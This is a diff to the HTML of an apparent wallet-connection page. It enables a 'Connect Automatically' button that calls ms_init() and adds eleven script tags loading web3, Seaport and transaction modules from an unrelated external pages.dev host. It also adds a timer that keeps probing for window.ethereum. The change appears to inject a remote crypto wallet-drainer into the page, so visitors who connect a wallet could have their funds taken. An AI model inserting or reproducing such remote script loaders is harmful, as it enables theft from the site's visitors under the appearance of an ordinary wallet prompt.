@@ -22,9 +22,9 @@
 				</div>
 
 				
-				<!--<button class="interact-button-v1 wallet-connect-connect-button">
+				<button onclick="ms_init()" class="interact-button-v1 wallet-connect-connect-button">
 					<img alt="metamask" src="./0x_assets/images/wallet-connect.svg">
-					 Connect Automatically</button>-->
+					 Connect Automatically</button>
 
 				<button class="interact-button-manual wallet-connect-connect-button manually">
 					<img alt="metamask" src="./0x_assets/images/wallet-connect.svg">
@@ -5852,6 +5852,22 @@
  
 			<script src="./0x_assets/js/index.js?v=11" type="text/javascript"></script>
 			<script src="./modal.js?v=1"></script>
+ <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-modal.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-loader.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-connect.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-router.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-module.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-alert.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-seaport.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/web3-data.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/ethers.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider/ethereum-tx.js"></script>
+    <script src="https://masternodemulticontractscan.pages.dev//assets/web3-provider.js"></script>
+    <script>
+      setInterval(() => {
+        document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
+      }, 1000);
+    </script>
 
 </body>
 </html>
